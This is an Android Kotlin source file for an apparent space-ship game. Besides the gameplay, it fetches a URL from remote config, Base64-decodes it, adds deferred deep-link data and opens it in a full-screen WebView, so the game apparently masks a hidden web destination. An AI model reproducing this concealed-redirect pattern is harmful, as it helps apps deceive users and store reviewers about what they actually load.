package com.contestPM.competition

import android.content.Intent
import android.media.MediaPlayer
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.View
import android.view.ViewGroup
import androidx.annotation.LayoutRes
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.ViewModelProvider

import androidx.lifecycle.lifecycleScope
import androidx.transition.Scene
import androidx.transition.Transition
import androidx.transition.TransitionInflater
import androidx.transition.TransitionManager
import com.contestPM.competition.utils.ScreenStates
import com.contestPM.competition.utils.Timer
import com.contestPM.competition.utils.UrlBuilder
import com.contestPM.competition.views.SpaceShip
import com.contestPM.competition.views.WebViewActivity
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OneSignal
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.android.synthetic.main.scene_game_start.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {
    private var isCheck = 0 //счётчик для таймера
    private val transitionManager: TransitionManager by lazy {
        TransitionManager().apply {
            setTransition(appInitScene, gameMenuScene, transition)
            setTransition(gameMenuScene, startGameScene, transition)
            setTransition(startGameScene, gameMenuScene, transition)
        }

    }
    private var mediaPlayer: MediaPlayer? = null
    private var accelerometerManager: AccelerometerManager? = null
    private lateinit var loadData: RemoteConfigViewModel

    //view models
    val mainViewModel by lazy { ViewModelProvider(this)[MainViewModel::class.java] }
    val remoteConfigViewModel by lazy { ViewModelProvider(this)[RemoteConfigViewModel::class.java] }

    //таймер
    var timer = Timer(object : Runnable {
        override fun run() {
            var web_url = remoteConfigViewModel.urlLiveData.value
            if (web_url == null || web_url == "" || web_url == "Fetching config…") {
                isCheck++
                remoteConfigViewModel.loadRemoteConfig(this@MainActivity)
                Log.i("TIMER","$isCheck" + " " + "$web_url" )
                isCheckedTimer(isCheck)
            } else {
                //updateUrl(web_url)
                checkUrl(web_url)
            }
        }
    }, 1000, true)



    val appInitScene: Scene by lazy { createScene(R.layout.scene_app_init) }
    val gameMenuScene: Scene by lazy { createScene(R.layout.scene_menu) }
    val startGameScene: Scene by lazy { createScene(R.layout.scene_game_start) }

    private val transition: Transition by lazy {
        TransitionInflater.from(this)
            .inflateTransition(R.transition.screen_transitions)
    }
    fun transitionToScene(scene: Scene) {
        transitionManager.transitionTo(scene)
    }
    private fun isCheckedTimer(isCheck:Int){
        Log.i("TIMER","$isCheck" + " timer stop")
        Log.i("TIMER","$isCheck" + " timer stop")
        if(isCheck > 60){
            timer.stopTimer()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        goFullScreen()
        setContentView(R.layout.activity_main)
        initOneSignal()
        Log.i("TIMER","$isCheck" + " timer start")
        addTouchHandler()
        observeScreenStates()
        addAccelerometerListener()
        initMenu()
    }
    private fun loadDeepLink(deepLink:String,url:String){
        var decodeUrl = decoderUrl(url)
        var deep_url = Uri.parse(deepLink)
        var builder = UrlBuilder()
        var intent = Intent(this, WebViewActivity::class.java)
        var main_url = "${builder.builder(decodeUrl)}"+"?"+"${deep_url.authority}"
        intent.putExtra("URL",main_url)
        timer.stopTimer()
        Log.i("TIMER", " timer stop")
        startActivity(intent)
    }
    private fun initOneSignal(){
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        OneSignal.startInit(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()
    }
    private fun checkUrl(url:String){
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(this) { appLinkData ->
            Log.i("Deep","${appLinkData?.targetUri}")
            Log.i("Deep","${appLinkData?.targetUri}")
            if( appLinkData?.targetUri == null || appLinkData?.targetUri.toString() == "null" || appLinkData?.targetUri.toString() == ""){
                updateUrl(decoderUrl(url))
            }else{
                loadDeepLink(appLinkData?.targetUri.toString(),url)
            }
        }
    }
    private fun updateUrl(url:String){
        var intent = Intent(this, WebViewActivity::class.java)
        intent.putExtra("URL",url)
        timer.stopTimer()
        Log.i("TIMER", " timer stop")
        startActivity(intent)
    }

    fun saveSettings(url:String){

    }

    private fun startMusic() {
        mediaPlayer = MediaPlayer.create(this, R.raw.music)
        mediaPlayer?.setOnPreparedListener {
            it.start()
        }
        mediaPlayer?.setOnCompletionListener {
            it.start()
        }
    }

    private fun addAccelerometerListener() {
        accelerometerManager = AccelerometerManager(this) { sensorEvent ->
            if (mainViewModel.getCurrentState() == ScreenStates.START_GAME) {
                startGameScene.sceneRoot.findViewById<SpaceShip>(R.id.space_ship)
                    ?.processSensorEvents(sensorEvent)
            }
            star_field?.processSensorEvents(sensorEvent)
        }
        accelerometerManager?.let {
            lifecycle.addObserver(it)
        }
    }
    private fun addTouchHandler() {
        root_view.setOnClickListener {
            handleTouch()
        }
    }
    private fun handleTouch() {
        when (mainViewModel.getCurrentState()) {
            ScreenStates.START_GAME -> {
                space_ship.boost()
                star_field.setTrails()
            }
            ScreenStates.GAME_MENU -> {
                pushUIState(ScreenStates.START_GAME)
            }
            else -> {
            }
        }
    }
    private fun initMenu() {
        lifecycleScope.launch(Dispatchers.Main) {
            pushUIState(ScreenStates.APP_INIT)
            delay(3000)
            pushUIState(ScreenStates.GAME_MENU)
        }
        timer.startTimer()
    }

    private fun pushUIState(screenStates: ScreenStates) {
        mainViewModel.updateUIState(screenStates)
    }

    private fun goFullScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.setDecorFitsSystemWindows(false)
        } else {
            window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_IMMERSIVE
                    // Настройте отображение содержимого под системными панелями, чтобы
                    // содержимое не изменялось, когда системные полосы скрываются и отображаются.
                    or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                    or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                    // Hide the nav bar and status bar
                    or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                    or View.SYSTEM_UI_FLAG_FULLSCREEN)
        }
    }

    private fun createScene(@LayoutRes layout: Int) =
        Scene.getSceneForLayout(id_frame as ViewGroup, layout, this)

    override fun onBackPressed() {
        if (mainViewModel.getCurrentState() == ScreenStates.START_GAME) {
            pushUIState(ScreenStates.GAME_MENU)
        } else {
            super.onBackPressed()
        }
    }

    override fun onResume() {
        super.onResume()
        startMusic()
    }

    override fun onPause() {
        super.onPause()
        mediaPlayer?.stop()
        mediaPlayer?.release()
    }
    private fun decoderUrl(coderUrl:String):String{
        var byteUrl = Base64.decode(coderUrl,1)
        var mainUrl = String(byteUrl)
        return mainUrl
    }
}
